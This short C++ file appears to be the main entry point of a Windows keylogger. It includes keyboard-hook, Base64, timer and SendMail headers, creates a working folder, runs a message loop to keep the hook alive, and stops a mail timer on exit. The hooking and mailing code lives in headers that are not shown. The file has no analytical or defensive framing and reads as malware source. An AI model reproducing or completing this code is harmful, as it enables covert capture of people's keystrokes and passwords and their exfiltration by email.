#include <iostream>
#include <windows.h>
#include "Helper.h"
#include "Key.h"
#include "Base64.h"
#include "IO.h"
#include "Timer.h"
#include "SendMail.h"
#include "KBHook.h"
using namespace std;

int main()
{
    MSG Msg;

    IO::MKDir(IO::GetOurPath(true));

    while(GetMessage (&Msg ,NULL,0,0))
    {
        TranslateMessage(&Msg);
        DispatchMessage (&Msg);
    }

    MailTimer.Stop();
    return 0;
}
